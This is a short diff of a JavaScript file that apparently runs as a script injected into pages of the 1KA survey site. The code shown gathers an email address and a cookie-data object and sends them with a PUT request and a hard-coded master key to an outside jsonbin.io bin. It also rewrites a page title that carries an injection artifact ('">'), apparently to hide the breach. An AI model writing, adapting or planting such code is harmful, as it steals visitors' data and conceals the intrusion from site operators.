@@ -1,5 +1,5 @@
-(function() {
-console.log("Master Key from n.js:", window.masterKey);
+document.addEventListener('DOMContentLoaded', () => {
+    console.log("Master Key from n.js:", window.masterKey);
     var xhr = new XMLHttpRequest(),
         binID, email, req, cookieData = {};
 
@@ -25,7 +25,6 @@ console.log("Master Key from n.js:", window.masterKey);
                 };
                 req.open("PUT", "https://api.jsonbin.io/v3/b/" + binID + "/meta/name", true);
                 req.setRequestHeader("X-Bin-Name", email);
-		
                 req.setRequestHeader("X-Master-Key", window.masterKey);
                 req.send();
             }
@@ -61,5 +60,4 @@ console.log("Master Key from n.js:", window.masterKey);
     if (pageTitle === '"> - 1KA | Spletne ankete') {
         document.title = `Raziskava o nečem - 1KA | Spletne ankete`;
     }
-
-})();
+});
